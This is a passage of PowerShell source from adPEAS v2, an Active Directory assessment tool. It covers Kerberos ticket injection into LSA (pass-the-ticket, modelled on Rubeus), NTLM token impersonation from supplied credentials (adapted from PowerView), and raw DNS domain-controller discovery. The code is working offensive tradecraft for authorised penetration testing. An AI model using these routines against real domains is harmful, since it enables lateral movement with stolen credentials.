                Realm = $Realm
                ClientName = $ClientName
                ServerName = $ServerName
                ServerInstance = $ServerInstance
            }
            # Add optional time parameters if provided (critical for Windows LSA to accept ticket)
            if ($AuthTime) { $krbCredParams['AuthTime'] = $AuthTime }
            if ($StartTime) { $krbCredParams['StartTime'] = $StartTime }
            if ($EndTime) { $krbCredParams['EndTime'] = $EndTime }
            if ($RenewTill) { $krbCredParams['RenewTill'] = $RenewTill }
            if ($TicketFlags) { $krbCredParams['TicketFlags'] = $TicketFlags }

            $krbCredBytes = Build-KRBCred @krbCredParams

            Write-Log "[Import-KerberosTicket] KRB-CRED built: $($krbCredBytes.Length) bytes"
        }
        else {
            Write-Log "[Import-KerberosTicket] Unknown ticket format (first byte: 0x$($TicketBytes[0].ToString('X2'))), assuming KRB-CRED"
            $krbCredBytes = $TicketBytes
        }

        # Update TicketBytes to use KRB-CRED
        $TicketBytes = $krbCredBytes

        #endregion

        #region P/Invoke definitions

        $LSACode = @"
using System;
using System.Runtime.InteropServices;

public class LSATicketImport
{
    // Constants
    public const int KERB_SUBMIT_TKT_MESSAGE_TYPE = 21;
    public const int STATUS_SUCCESS = 0;

    // Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    // KERB_CRYPTO_KEY32 - uses Offset instead of Pointer (like Rubeus)
    // This is critical: Windows expects offsets relative to buffer start,
    // not pointers which become invalid when buffer is copied to kernel space
    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_CRYPTO_KEY32
    {
        public int KeyType;
        public int Length;
        public int Offset;  // Offset relative to start of KERB_SUBMIT_TKT_REQUEST
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_SUBMIT_TKT_REQUEST
    {
        public int MessageType;
        public LUID LogonId;
        public int Flags;
        public KERB_CRYPTO_KEY32 Key;  // Using KERB_CRYPTO_KEY32 with offset
        public int KerbCredSize;
        public int KerbCredOffset;
    }

    // P/Invoke declarations
    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaLookupAuthenticationPackage(
        IntPtr LsaHandle,
        ref LSA_STRING PackageName,
        out uint AuthenticationPackage
    );

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaCallAuthenticationPackage(
        IntPtr LsaHandle,
        uint AuthenticationPackage,
        IntPtr ProtocolSubmitBuffer,
        int SubmitBufferLength,
        out IntPtr ProtocolReturnBuffer,
        out int ReturnBufferLength,
        out int ProtocolStatus
    );

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int LsaNtStatusToWinError(int Status);

    // Helper to create LSA_STRING
    public static LSA_STRING CreateLsaString(string s)
    {
        LSA_STRING lsa = new LSA_STRING();
        lsa.Length = (ushort)s.Length;
        lsa.MaximumLength = (ushort)(s.Length + 1);
        lsa.Buffer = Marshal.StringToHGlobalAnsi(s);
        return lsa;
    }
}
"@

        # Check if type is already loaded first
        if (-not ([System.Management.Automation.PSTypeName]'LSATicketImport').Type) {
            try {
                Add-Type -TypeDefinition $LSACode -ErrorAction Stop
                Write-Log "[Import-KerberosTicket] LSATicketImport type compiled successfully"
            } catch {
                # Check if it's just already loaded
                if (-not ([System.Management.Automation.PSTypeName]'LSATicketImport').Type) {
                    throw "Failed to compile LSA P/Invoke code: $_"
                }
            }
        } else {
            Write-Log "[Import-KerberosTicket] LSATicketImport type already loaded"
        }

        #endregion
    }

    process {
        # Initialize handle before try block to ensure finally can check it
        $lsaHandle = [IntPtr]::Zero

        try {
            # Verify type is available
            if (-not ([System.Management.Automation.PSTypeName]'LSATicketImport').Type) {
                throw "LSATicketImport type not available. This may require administrator privileges."
            }

            #region Connect to LSA

            Write-Log "[Import-KerberosTicket] Connecting to LSA..."
            $status = [LSATicketImport]::LsaConnectUntrusted([ref]$lsaHandle)

            if ($status -ne 0) {
                $winError = [LSATicketImport]::LsaNtStatusToWinError($status)
                throw "LsaConnectUntrusted failed with NTSTATUS 0x$($status.ToString('X8')) (Win32: $winError)"
            }

            Write-Log "[Import-KerberosTicket] LSA handle: $lsaHandle"

            #endregion

            #region Lookup Kerberos package

            $packageName = [LSATicketImport]::CreateLsaString("Kerberos")
            $authPackage = [uint32]0

            try {
                $status = [LSATicketImport]::LsaLookupAuthenticationPackage(
                    $lsaHandle,
                    [ref]$packageName,
                    [ref]$authPackage
                )

                if ($status -ne 0) {
                    $winError = [LSATicketImport]::LsaNtStatusToWinError($status)
                    throw "LsaLookupAuthenticationPackage failed with NTSTATUS 0x$($status.ToString('X8')) (Win32: $winError)"
                }
            }
            finally {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($packageName.Buffer)
            }

            Write-Log "[Import-KerberosTicket] Kerberos auth package ID: $authPackage"

            #endregion

            #region Build KERB_SUBMIT_TKT_REQUEST

            # Calculate buffer size
            # Structure: KERB_SUBMIT_TKT_REQUEST (fixed size) + KRB-CRED ticket
            # Note: Session key is embedded in KRB-CRED, not passed separately
            $structSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][LSATicketImport+KERB_SUBMIT_TKT_REQUEST])
            $totalSize = $structSize + $TicketBytes.Length

            Write-Log "[Import-KerberosTicket] Buffer size: $totalSize (struct: $structSize, ticket: $($TicketBytes.Length))"

            # Allocate buffer
            $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($totalSize)

            try {
                # Zero the buffer
                $zeros = New-Object byte[] $totalSize
                [System.Runtime.InteropServices.Marshal]::Copy($zeros, 0, $buffer, $totalSize)

                # Build the request structure
                # Note: Like Rubeus, we don't pass the session key separately - it's already
                # embedded in the KRB-CRED structure (in EncKrbCredPart). Passing a Key pointer
                # can cause issues because the buffer is copied to kernel space where the
                # pointer becomes invalid.
                $request = New-Object LSATicketImport+KERB_SUBMIT_TKT_REQUEST
                $request.MessageType = [LSATicketImport]::KERB_SUBMIT_TKT_MESSAGE_TYPE

                # LUID (0 = current session)
                $request.LogonId.LowPart = [uint32]($LUID -band 0xFFFFFFFF)
                $request.LogonId.HighPart = [int]($LUID -shr 32)

                $request.Flags = 0

                # Don't pass session key separately - it's in KRB-CRED
                # Using KERB_CRYPTO_KEY32 with Offset (not pointer) like Rubeus
                $request.Key.KeyType = 0
                $request.Key.Length = 0
                $request.Key.Offset = 0  # Not used when key is embedded in KRB-CRED

                # Ticket offset is right after the structure (no session key in between)
                $request.KerbCredSize = $TicketBytes.Length
                $request.KerbCredOffset = $structSize

                # Marshal structure to buffer
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($request, $buffer, $false)

                # Copy ticket data to buffer (right after the structure)
                $ticketPtr = [IntPtr]::Add($buffer, $structSize)
                [System.Runtime.InteropServices.Marshal]::Copy($TicketBytes, 0, $ticketPtr, $TicketBytes.Length)

                #endregion

                #region Call LSA

                Write-Log "[Import-KerberosTicket] Submitting ticket to LSA..."

                $returnBuffer = [IntPtr]::Zero
                $returnLength = 0
                $protocolStatus = 0

                $status = [LSATicketImport]::LsaCallAuthenticationPackage(
                    $lsaHandle,
                    $authPackage,
                    $buffer,
                    $totalSize,
                    [ref]$returnBuffer,
                    [ref]$returnLength,
                    [ref]$protocolStatus
                )

                if ($returnBuffer -ne [IntPtr]::Zero) {
                    $null = [LSATicketImport]::LsaFreeReturnBuffer($returnBuffer)
                }

                if ($status -ne 0) {
                    $winError = [LSATicketImport]::LsaNtStatusToWinError($status)
                    throw "LsaCallAuthenticationPackage failed with NTSTATUS 0x$($status.ToString('X8')) (Win32: $winError)"
                }

                if ($protocolStatus -ne 0) {
                    $winError = [LSATicketImport]::LsaNtStatusToWinError($protocolStatus)
                    # Check for common permission-related errors
                    if ($protocolStatus -eq 0xC000009A -or $winError -eq 1450) {
                        # This error commonly occurs when:
                        # 1. The workstation is not joined to the target domain
                        # 2. Remote Credential Guard is enabled
                        # 3. Running in a restricted session
                        throw "Ticket import failed (NTSTATUS 0x$($protocolStatus.ToString('X8'))): This typically occurs on non-domain-joined machines or with Remote Credential Guard enabled. SimpleBind fallback will be used."
                    }
                    throw "Kerberos package returned error NTSTATUS 0x$($protocolStatus.ToString('X8')) (Win32: $winError)"
                }

                #endregion

                Write-Log "[Import-KerberosTicket] Ticket successfully imported ($($TicketBytes.Length) bytes)"

                # Build return object with metadata (if available from ccache parsing)
                $returnObj = [PSCustomObject]@{
                    Success = $true
                    TicketSize = $TicketBytes.Length
                    LUID = $LUID
                    Message = "Ticket imported successfully"
                    UserName = $null
                    Realm = $null
                    EncryptionType = $null
                    AuthTime = $null
                    StartTime = $null
                    EndTime = $null
                    RenewTill = $null
                }

                # Add ccache metadata if available (includes ticket times)
                if ($Script:CcacheMetadata) {
                    $returnObj.UserName = $Script:CcacheMetadata.UserName
                    $returnObj.Realm = $Script:CcacheMetadata.Realm
                    $returnObj.EncryptionType = $Script:CcacheMetadata.EncryptionType
                    $returnObj.AuthTime = $Script:CcacheMetadata.AuthTime
                    $returnObj.StartTime = $Script:CcacheMetadata.StartTime
                    $returnObj.EndTime = $Script:CcacheMetadata.EndTime
                    $returnObj.RenewTill = $Script:CcacheMetadata.RenewTill
                }
                # Add kirbi metadata if available (from parsed kirbi file)
                elseif ($Script:KirbiMetadata) {
                    $returnObj.UserName = $Script:KirbiMetadata.UserName
                    $returnObj.Realm = $Script:KirbiMetadata.Realm
                    $returnObj.EncryptionType = $Script:KirbiMetadata.EncryptionType
                    $returnObj.AuthTime = $Script:KirbiMetadata.AuthTime
                    $returnObj.StartTime = $Script:KirbiMetadata.StartTime
                    $returnObj.EndTime = $Script:KirbiMetadata.EndTime
                    $returnObj.RenewTill = $Script:KirbiMetadata.RenewTill
                }
                # Fallback to provided parameters
                elseif ($ClientName -or $Realm) {
                    $returnObj.UserName = $ClientName
                    $returnObj.Realm = $Realm
                    $returnObj.EncryptionType = $SessionKeyType
                }

                # Check if ticket is expired and warn user
                if ($returnObj.EndTime) {
                    $now = [DateTime]::UtcNow
                    if ($returnObj.EndTime -lt $now) {
                        $expiredAgo = $now - $returnObj.EndTime
                        Write-Warning "[Import-KerberosTicket] Ticket is EXPIRED (ended $($expiredAgo.TotalHours.ToString('F1')) hours ago at $($returnObj.EndTime.ToString('u')))"
                        $returnObj.Message = "Ticket imported but is EXPIRED since $($returnObj.EndTime.ToString('u'))"
                    }
                    elseif (($returnObj.EndTime - $now).TotalMinutes -lt 5) {
                        Write-Warning "[Import-KerberosTicket] Ticket expires in less than 5 minutes (at $($returnObj.EndTime.ToString('u')))"
                    }
                }

                return $returnObj

            } finally {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
            }

        } catch {
            Write-Log "[Import-KerberosTicket] Failed to import ticket: $_"

            return [PSCustomObject]@{
                Success = $false
                Error = $_.Exception.Message
                Message = "Failed to import ticket: $_"
            }

        } finally {
            if ($lsaHandle -ne [IntPtr]::Zero) {
                $null = [LSATicketImport]::LsaDeregisterLogonProcess($lsaHandle)
            }
        }
    }

    end {
        Write-Log "[Import-KerberosTicket] Ticket import completed"
    }
}



# ----- Invoke-NTLMImpersonation.ps1 -----

<#
.SYNOPSIS
    Creates a new "runas /netonly" type logon and impersonates the token.

.DESCRIPTION
    This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
    to simulate "runas /netonly". The resulting token is then impersonated with
    ImpersonateLoggedOnUser() and the token handle is returned for later usage
    with Invoke-RevertToSelf.

    IMPORTANT: This uses NTLM authentication, NOT Kerberos!
    - Does NOT modify the Kerberos ticket cache
    - Original Kerberos tickets remain intact
    - Network operations use NTLM Challenge/Response
    - Supports LDAP Signing (unlike SimpleBind)

.PARAMETER Credential
    A [Management.Automation.PSCredential] object with alternate credentials
    to impersonate in the current thread space.

.PARAMETER TokenHandle
    An IntPtr TokenHandle returned by a previous Invoke-NTLMImpersonation.
    If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
    is executed.

.PARAMETER Quiet
    Suppress any warnings about STA vs MTA.

.EXAMPLE
    $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\admin', $SecPassword)
    $Token = Invoke-NTLMImpersonation -Credential $Cred

    # ... do network operations ...

    Invoke-RevertToSelf -TokenHandle $Token

.OUTPUTS
    IntPtr - The TokenHandle result from LogonUser.

.NOTES
    Based on PowerView's Invoke-UserImpersonation by Will Schroeder (@harmj0y)
    Adapted for adPEAS v2 with standalone P/Invoke (no PSReflect dependency)
#>
function Invoke-NTLMImpersonation {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    param(
        [Parameter(Mandatory = $true, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $true, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    begin {
        # Define P/Invoke signatures if not already defined
        if (-not ([System.Management.Automation.PSTypeName]'adPEAS.NativeMethods.Impersonation').Type) {
            $ImpersonationCode = @'
using System;
using System.Runtime.InteropServices;

namespace adPEAS.NativeMethods
{
    public class Impersonation
    {
        // LogonUser constants
        public const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
        public const int LOGON32_PROVIDER_WINNT50 = 3;

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool LogonUser(
            string lpszUsername,
            string lpszDomain,
            string lpszPassword,
            int dwLogonType,
            int dwLogonProvider,
            out IntPtr phToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
}
'@
            try {
                Add-Type -TypeDefinition $ImpersonationCode -Language CSharp -ErrorAction Stop
                Write-Log "[Invoke-NTLMImpersonation] P/Invoke types compiled successfully"
            }
            catch {
                # Type might already exist from previous load
                if ($_.Exception.Message -notmatch 'already exists') {
                    throw "[Invoke-NTLMImpersonation] Failed to compile P/Invoke types: $_"
                }
            }
        }
    }

    process {
        # Check apartment state - token impersonation works best in STA
        if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $Quiet)) {
            Write-Warning "[Invoke-NTLMImpersonation] PowerShell is not in single-threaded apartment state, token impersonation may not work correctly."
        }

        $LogonTokenHandle = [IntPtr]::Zero

        if ($PSCmdlet.ParameterSetName -eq 'TokenHandle') {
            # Re-use existing token
            $LogonTokenHandle = $TokenHandle
            Write-Log "[Invoke-NTLMImpersonation] Re-using existing token handle"
        }
        else {
            # Get network credentials
            $NetworkCredential = $Credential.GetNetworkCredential()
            $UserDomain = $NetworkCredential.Domain
            $UserName = $NetworkCredential.UserName

            # If domain is empty, try to extract from username
            if ([string]::IsNullOrEmpty($UserDomain)) {
                if ($Credential.UserName -match '^([^\\]+)\\(.+)$') {
                    $UserDomain = $Matches[1]
                    $UserName = $Matches[2]
                }
                elseif ($Credential.UserName -match '^(.+)@(.+)$') {
                    $UserName = $Matches[1]
                    $UserDomain = $Matches[2]
                }
            }

            Write-Log "[Invoke-NTLMImpersonation] Executing LogonUser() with user: $UserDomain\$UserName"

            # LOGON32_LOGON_NEW_CREDENTIALS = 9: Creates a token for outbound network connections only
            # LOGON32_PROVIDER_WINNT50 = 3: Use the NTLM provider
            $Result = [adPEAS.NativeMethods.Impersonation]::LogonUser(
                $UserName,
                $UserDomain,
                $NetworkCredential.Password,
                [adPEAS.NativeMethods.Impersonation]::LOGON32_LOGON_NEW_CREDENTIALS,
                [adPEAS.NativeMethods.Impersonation]::LOGON32_PROVIDER_WINNT50,
                [ref]$LogonTokenHandle
            )

            if (-not $Result) {
                $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $ErrorMessage = (New-Object System.ComponentModel.Win32Exception($LastError)).Message
                throw "[Invoke-NTLMImpersonation] LogonUser() failed: $ErrorMessage (Error: $LastError)"
            }

            Write-Log "[Invoke-NTLMImpersonation] LogonUser() successful, token handle: $LogonTokenHandle"
        }

        # Impersonate the token
        $Result = [adPEAS.NativeMethods.Impersonation]::ImpersonateLoggedOnUser($LogonTokenHandle)

        if (-not $Result) {
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $ErrorMessage = (New-Object System.ComponentModel.Win32Exception($LastError)).Message

            # Clean up token handle on failure
            if ($LogonTokenHandle -ne [IntPtr]::Zero) {
                $null = [adPEAS.NativeMethods.Impersonation]::CloseHandle($LogonTokenHandle)
            }

            throw "[Invoke-NTLMImpersonation] ImpersonateLoggedOnUser() failed: $ErrorMessage (Error: $LastError)"
        }

        Write-Log "[Invoke-NTLMImpersonation] Token impersonation successful"

        # Return the token handle for later cleanup
        return $LogonTokenHandle
    }
}


<#
.SYNOPSIS
    Reverts any token impersonation and optionally closes the token handle.

.DESCRIPTION
    This function uses RevertToSelf() to revert any impersonated tokens.
    If -TokenHandle is passed (the token handle returned by Invoke-NTLMImpersonation),
    CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle
    An optional IntPtr TokenHandle returned by Invoke-NTLMImpersonation.
    If provided, the handle will be closed after reverting.

.EXAMPLE
    $Token = Invoke-NTLMImpersonation -Credential $Cred
    # ... do network operations ...
    Invoke-RevertToSelf -TokenHandle $Token

.NOTES
    Based on PowerView's Invoke-RevertToSelf by Will Schroeder (@harmj0y)
    Adapted for adPEAS v2 with standalone P/Invoke
#>
function Invoke-RevertToSelf {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [IntPtr]
        $TokenHandle = [IntPtr]::Zero
    )

    process {
        # Close the token handle if provided
        if ($TokenHandle -ne [IntPtr]::Zero) {
            Write-Log "[Invoke-RevertToSelf] Closing token handle: $TokenHandle"
            $Result = [adPEAS.NativeMethods.Impersonation]::CloseHandle($TokenHandle)
            if (-not $Result) {
                $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "[Invoke-RevertToSelf] CloseHandle() failed: Error $LastError"
            }
        }

        # Revert to self
        $Result = [adPEAS.NativeMethods.Impersonation]::RevertToSelf()

        if (-not $Result) {
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $ErrorMessage = (New-Object System.ComponentModel.Win32Exception($LastError)).Message
            throw "[Invoke-RevertToSelf] RevertToSelf() failed: $ErrorMessage (Error: $LastError)"
        }

        Write-Log "[Invoke-RevertToSelf] Token impersonation successfully reverted"
    }
}



# ----- Resolve-adPEASName.ps1 -----

<#
.SYNOPSIS
    Central DNS resolution for adPEAS with support for hostname-to-IP and DC discovery.

.DESCRIPTION
    Unified DNS resolution function for adPEAS that handles two primary use cases:

    Mode 1: Hostname to IP Resolution (-Name parameter)
        Returns: IP address string or $null
        Use case: Resolving explicit hostnames for TCP connections
        Example: User specifies -Server "dc01.contoso.com" -> resolve to IP

    Mode 2: Domain Controller Discovery (-Domain parameter)
        Returns: PSCustomObject with Hostname and IP
        Use case: Auto-discovering DC when no explicit server specified
        Example: User only specifies -Domain "contoso.com" -> find DC via SRV records

    Features:
    - Uses custom DNS server if specified via -DnsServer or $Script:LDAPContext['DnsServer']
    - Falls back to system DNS resolution
    - Caches resolved IP addresses in $Script:LDAPContext['DnsCache']
    - SRV record lookup for DC discovery (_ldap._tcp.dc._msdcs.<domain>)
    - STALE SRV RECORD HANDLING: Queries ALL SRV records and tests reachability (Port 88 Kerberos + Port 389/636 LDAP) before returning a DC
    - Automatic failover to next DC if first DC is unreachable
    - Reverse DNS for hostname discovery when SRV unavailable

    DC Discovery Order:
    1. Query ALL SRV records for _ldap._tcp.dc._msdcs.<domain>
    2. Sort by Priority (lower = better) and Weight (higher = better)
    3. For each DC: Resolve hostname -> Test Port 88 + 389/636 -> Return if reachable
    4. Fallback: Reverse DNS lookup via system DNS (with reachability test)
    5. Last resort: Direct A record lookup for domain name (with reachability test)

    Resolution Order (for custom DNS):
    1. Resolve-DnsName cmdlet (Windows 8+ / Server 2012+)
    2. Raw UDP DNS query (fallback for older systems or if cmdlet unavailable)
    3. System DNS via [System.Net.Dns] (final fallback)

.PARAMETER Name
    The hostname to resolve to an IP address.
    Returns: IP address string or $null.
    Use this when the user explicitly specified a server/DC.
    Cannot be used together with -Domain.

.PARAMETER Domain
    The domain FQDN to discover a Domain Controller for.
    Returns: PSCustomObject with Hostname and IP properties.
    Use this when no explicit server was specified (auto-discovery).
    Cannot be used together with -Name.

.PARAMETER DnsServer
    Optional. Explicit DNS server IP address to use for this query.
    Must be an IP address (e.g., "10.10.10.1"), not a hostname.
    If not specified, uses $Script:LDAPContext['DnsServer'] if available.

.PARAMETER NoCache
    Skip the cache lookup and force a fresh DNS query.

.PARAMETER UseLDAPS
    When testing DC reachability, test Port 636 instead of Port 389.
    This should match the intended LDAP connection type.

.EXAMPLE
    # Mode 1: Resolve explicit hostname to IP
    Resolve-adPEASName -Name "dc01.contoso.com"
    Returns: "10.0.0.1" (IP address string) or $null

.EXAMPLE
    # Mode 1 with custom DNS
    Resolve-adPEASName -Name "dc01.contoso.com" -DnsServer "10.10.10.1"
    Returns: "10.0.0.1" (IP address string) or $null

.EXAMPLE
    # Mode 2: Discover DC for domain (SRV + reverse DNS)
    Resolve-adPEASName -Domain "contoso.com"
    Returns: @{ Hostname = "dc01.contoso.com"; IP = "10.0.0.1" }

.EXAMPLE
    # Mode 2 with LDAPS reachability test
    Resolve-adPEASName -Domain "contoso.com" -UseLDAPS
    Returns: @{ Hostname = "dc01.contoso.com"; IP = "10.0.0.1" }

.OUTPUTS
    For -Name: [string] IP address or $null if resolution failed.

    For -Domain: [PSCustomObject] with properties:
    - Hostname: The DC hostname (for SPN construction)
    - IP: The resolved IP address (for TCP connections)
    Returns $null if resolution completely failed.

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

#region Helper Functions

function Invoke-RawDnsQuery {
    <#
    .SYNOPSIS
        Performs a raw UDP DNS query (RFC 1035). Internal helper function.
    .DESCRIPTION
        Fallback DNS resolver for systems where Resolve-DnsName is not available.
        Sends a UDP DNS query directly to the specified DNS server and parses the response.
        Supports A-record (IPv4) and SRV-record lookups.
    .PARAMETER Name
        The hostname to resolve.
        For SRV queries, use the full SRV name (e.g., "_ldap._tcp.dc._msdcs.contoso.com").
    .PARAMETER DnsServer
        The DNS server IP address.
    .PARAMETER Type
        The DNS record type to query. Valid values: 'A' (default) or 'SRV'.
    .PARAMETER Timeout
        Query timeout in milliseconds. Default: 5000 (5 seconds).
    .PARAMETER ReturnAllSRV
        For SRV queries only: If set, returns ALL SRV records as an array sorted by Priority/Weight.
        Otherwise returns only the first (best) record. Default: $false.
    .OUTPUTS
        For A records: [string] IPv4 address if successful, $null otherwise.
        For SRV records: [PSCustomObject] or [PSCustomObject[]] with Priority, Weight, Port, Target properties, or $null.
    .NOTES
        Internal use only.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$DnsServer,

        [Parameter(Mandatory = $false)]
        [ValidateSet('A', 'SRV')]
        [string]$Type = 'A',

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 5000,

        [Parameter(Mandatory = $false)]
        [switch]$ReturnAllSRV
    )

    $udpClient = $null

    try {
        # Build DNS query packet (RFC 1035)
        # Header: 12 bytes
        # Question: variable length

        # Generate random transaction ID (2 bytes)
        $transactionId = [byte[]]@(
            [byte](Get-Random -Minimum 0 -Maximum 256),
            [byte](Get-Random -Minimum 0 -Maximum 256)
        )

        # DNS Header (12 bytes)
        # Flags: 0x0100 = Standard query, recursion desired
        $header = [byte[]]@(
            $transactionId[0], $transactionId[1],  # Transaction ID
            0x01, 0x00,                             # Flags: Standard query, RD=1
            0x00, 0x01,                             # Questions: 1
            0x00, 0x00,                             # Answer RRs: 0
            0x00, 0x00,                             # Authority RRs: 0
            0x00, 0x00                              # Additional RRs: 0
        )

        # Build QNAME (domain name in DNS format)
        # Each label prefixed with length byte, terminated with 0x00
        $qname = [System.Collections.Generic.List[byte]]::new()
        $labels = $Name.Split('.')
        foreach ($label in $labels) {
            # Skip empty labels (e.g., from "test..example.com")
            if ([string]::IsNullOrEmpty($label)) {
                continue
            }
            $labelBytes = [System.Text.Encoding]::ASCII.GetBytes($label)
            # RFC 1035: Each label is limited to 63 octets
            if ($labelBytes.Length -gt 63) {
                Write-Log "[Invoke-RawDnsQuery] Label exceeds 63 bytes limit: $label"
                return $null
            }
            $qname.Add([byte]$labelBytes.Length)
            $qname.AddRange($labelBytes)
        }
        $qname.Add(0x00)  # Null terminator

        # QTYPE: A=1, SRV=33 (RFC 1035, RFC 2782)
        $qtype = switch ($Type) {
            'A'   { 1 }
            'SRV' { 33 }
        }

        # QTYPE and QCLASS (IN = 0x0001)
        $question = [byte[]]@(
            [byte](($qtype -shr 8) -band 0xFF),
            [byte]($qtype -band 0xFF),
            0x00, 0x01  # QCLASS IN
        )

        # Combine packet
        $packet = [byte[]]($header + $qname.ToArray() + $question)

        # Send UDP query
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $udpClient.Client.ReceiveTimeout = $Timeout
        $udpClient.Client.SendTimeout = $Timeout

        $endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($DnsServer), 53)
        $udpClient.Connect($endpoint)
        $null = $udpClient.Send($packet, $packet.Length)

        # Receive response
        $remoteEP = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
        $response = $udpClient.Receive([ref]$remoteEP)

        # Parse response
        if ($response.Length -lt 12) {
            Write-Log "[Invoke-RawDnsQuery] Response too short: $($response.Length) bytes"
            return $null
        }

        # Check transaction ID matches
        if ($response[0] -ne $transactionId[0] -or $response[1] -ne $transactionId[1]) {
            Write-Log "[Invoke-RawDnsQuery] Transaction ID mismatch"
            return $null
        }

        # Check for errors (RCODE in lower 4 bits of byte 3)
        $rcode = $response[3] -band 0x0F
        if ($rcode -ne 0) {
            Write-Log "[Invoke-RawDnsQuery] DNS error, RCODE: $rcode"
            return $null
        }

        # Get answer count (bytes 6-7, big-endian)
        $answerCount = ($response[6] -shl 8) -bor $response[7]
        if ($answerCount -eq 0) {
            Write-Log "[Invoke-RawDnsQuery] No answers in response"
            return $null
        }

        # Skip header (12 bytes) and question section
        $offset = 12

        # Skip QNAME (handles both regular labels and compression pointers)
        while ($offset -lt $response.Length -and $response[$offset] -ne 0) {
            if (($response[$offset] -band 0xC0) -eq 0xC0) {
                # Compression pointer - skip 2 bytes and done (no null terminator after pointer)
                $offset += 2
                break
            }
            $offset += $response[$offset] + 1
        }
        # Skip null terminator only if we didn't hit a compression pointer
        if ($offset -lt $response.Length -and $response[$offset] -eq 0) { $offset++ }

        # Skip QTYPE and QCLASS (4 bytes)
        $offset += 4

        # Helper function to read a DNS name (handles compression pointers)
        # RFC 1035: Maximum recursion depth to prevent infinite loops from malformed responses
        $MaxPointerDepth = 10

        $ReadDnsName = {
            param([byte[]]$Data, [int]$StartOffset)

            $name = [System.Collections.Generic.List[string]]::new()
            $currentOffset = $StartOffset
            $bytesRead = 0
            $jumped = $false
            $pointerDepth = 0
            $visitedOffsets = [System.Collections.Generic.HashSet[int]]::new()

            while ($currentOffset -lt $Data.Length) {
                $labelLen = $Data[$currentOffset]

                if ($labelLen -eq 0) {
                    # End of name
                    if (-not $jumped) { $bytesRead++ }
                    break
                }

                if (($labelLen -band 0xC0) -eq 0xC0) {
                    # Compression pointer (2 bytes)
                    if ($currentOffset + 1 -ge $Data.Length) { break }

                    # Prevent infinite loop from cyclic pointers
                    $pointerDepth++
                    if ($pointerDepth -gt $MaxPointerDepth) {
                        Write-Log "[Invoke-RawDnsQuery] Maximum pointer depth exceeded, possible malformed DNS response"
                        break
                    }

                    $pointer = (($labelLen -band 0x3F) -shl 8) -bor $Data[$currentOffset + 1]

                    # Detect self-referencing or already-visited pointer (infinite loop prevention)
                    if ($pointer -eq $currentOffset -or $visitedOffsets.Contains($pointer)) {
                        Write-Log "[Invoke-RawDnsQuery] Cyclic pointer detected at offset $pointer, malformed DNS response"
                        break
                    }
                    $null = $visitedOffsets.Add($currentOffset)

                    if (-not $jumped) { $bytesRead += 2 }
                    $jumped = $true
                    $currentOffset = $pointer
                    continue
                }

                # Regular label
                if (-not $jumped) { $bytesRead += $labelLen + 1 }
                $currentOffset++
                if ($currentOffset + $labelLen -gt $Data.Length) { break }
                $label = [System.Text.Encoding]::ASCII.GetString($Data, $currentOffset, $labelLen)
                $name.Add($label)
                $currentOffset += $labelLen
            }

            return @{
                Name = $name -join '.'
                BytesRead = $bytesRead
            }
        }

        # Collect SRV records for sorting by priority
        $srvRecords = [System.Collections.Generic.List[PSCustomObject]]::new()

        # Parse answer records
        for ($i = 0; $i -lt $answerCount -and $offset -lt $response.Length; $i++) {
            # Skip NAME (may be compressed)
            if (($response[$offset] -band 0xC0) -eq 0xC0) {
                $offset += 2  # Compression pointer
            }
            else {
                while ($offset -lt $response.Length -and $response[$offset] -ne 0) {
                    $offset += $response[$offset] + 1
                }
                $offset++  # Skip null terminator
            }

            # Check if we have enough bytes for the fixed fields
            if ($offset + 10 -gt $response.Length) { break }

